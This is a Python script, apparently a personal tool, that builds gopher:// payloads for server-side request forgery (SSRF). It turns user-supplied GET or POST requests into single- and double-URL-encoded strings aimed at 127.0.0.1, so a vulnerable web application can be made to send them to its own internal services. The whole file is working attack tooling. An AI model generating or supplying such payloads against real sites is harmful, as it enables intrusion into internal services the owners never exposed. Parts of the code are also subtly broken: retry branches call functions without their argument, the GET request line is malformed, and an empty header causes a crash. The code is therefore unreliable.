#-*- codeing = utf-8 -*-
#@Time :  14:10
#@Author : LTLT
#@File : GopherEncode.py
#@Software : PyCharm

import requests
import urllib3
import sys

print("--*--Python3.8--*---")
print("--*-Author  LTLT-*--")

content = {}
#GET/POST
def REQUEST_TYPE(in_):
	if in_ != '':
		content['TYPE'] = in_
		return
	print("请选择包体请求类型:  1.[GET]  2.[POST]")
	Requ_type = input()
	if Requ_type == '1':
		content['TYPE'] = 'GET'
	elif Requ_type == '2':
		content['TYPE'] = 'POST'
	else:
		print("请选择1或者2")
		REQUEST_TYPE()

#请求URL
def REQUEST_URL(in_):
	if in_ != '':
		content['URL'] = in_
		return
	print("请输入包体中的请求URL")
	print("例如: /ssrf/attack.php")
	Requ_url = input()
	content['URL'] = Requ_url

#Host
def REQUEST_HOST(in_):
	if in_ != '':
		content['HOST'] = in_
		return
	print("请输入Host,输入1默认127.0.0.1:80")
	Requ_host = input()
	if Requ_host == '1':
		content['HOST'] = '127.0.0.1:80'
	else:
		content['HOST'] = Requ_host

#参数
def REQUEST_PARAMETER(in_):
	if in_ != '':
		content['PARAMETER'] = in_
		return
	print("请输入参数与值")
	print("例如: name=test&age=18")
	Requ_parameter = input()
	content['PARAMETER'] = Requ_parameter

#协议端口
def REQUEST_PORT(in_):
	if in_ != '':
		content['PORT'] = in_
		return
	print("如果是http协议请输入1,如果是https协议请输入2")
	Requ_port = input()
	if Requ_port == '1':
		content['PORT'] = '80'
	elif Requ_port == '2':
		content['PORT'] = '443'
	else:
		print("请输入1或者2")
		REQUEST_PORT()

def REQUEST_HEADER(in_):
	if in_ != '':
		content['HEDAER'] = in_
		return
	print("自定义header,输入headerName: key1=value1;key2=value2,结束添加请直接回车")
	Requ_header_conts = ""
	while(1):
		Requ_header_cont = input()
		if Requ_header_cont == "":
			break
		Requ_header_conts = Requ_header_conts + Requ_header_cont + "\n"
		content['HEDAER'] = Requ_header_conts


def HEX(hex_a):
	hex_b = bytes(hex_a, encoding='UTF-8')
	hex_o = ''.join('%{:02x}'.format(x) for x in hex_b)
	return hex_o

def main(in_):
	if in_ == '':
		REQUEST_TYPE("")
		REQUEST_URL("")
		REQUEST_HOST("")
		REQUEST_PARAMETER("")
		REQUEST_PORT("")
		REQUEST_HEADER("")
	else:
		REQUEST_TYPE(sys.argv[1])
		REQUEST_URL(sys.argv[2])
		REQUEST_HOST(sys.argv[3])
		REQUEST_PARAMETER(sys.argv[4])
		REQUEST_PORT(sys.argv[5])
		REQUEST_HEADER(sys.argv[6].replace('</br>',"\n")+"\n")
	if content['TYPE'] == 'POST':
		Payload_unhex = 'gopher://127.0.0.1:'+content['PORT']+'/_'
		Payload_hex = content['TYPE']+' '+content['URL']+''' HTTP/1.1
Host: '''+content['HOST']+'''\nContent-Type: application/x-www-form-urlencoded\n'''+content['HEDAER']+'''Content-Length: '''+str(len(content['PARAMETER']))+'''\n\n'''+content['PARAMETER']+'''\n'''
	elif content['TYPE'] == 'GET':
		Payload_unhex = 'gopher://127.0.0.1:'+content['PORT']+'/_'
		Payload_hex = content['TYPE']+' '+content['URL']+'?'+content['PARAMETER']+' '+'''HTTP 1.1\nHost: '''+content['HOST']+'''\n'''+content['HEDAER']+'''\n'''

	hex_0a = HEX(Payload_hex)
	hex_0d0a = hex_0a.replace('%0a', '%0d%0a')
	print("一次编码&%0a转换%0d%0a Payload[Curl用]")
	print(Payload_unhex+hex_0d0a)
	hex_end = HEX(hex_0d0a)
	print("二次编码&%0a转换%0d%0a Payload[Web用]")
	print(Payload_unhex+hex_end)

if __name__ == '__main__':
	if len(sys.argv)!=1 and len(sys.argv)<5:
		print("""提供接口模式和手动模式
接口模式参数python3 GopherHex.py
[METHOD(GET|POST)] [URL(/index.php)] [HOST(127.0.0.1:80)] [输入参数(key1=value1&key2=value2)] [输入端口(80|445)] [Header(Cookie: PHPSESSID=test</br>token=123)换行用</br>进行占位]
""")
	elif len(sys.argv)==1:
		# 手动模式
		main("")
	else:
		main(1)
		
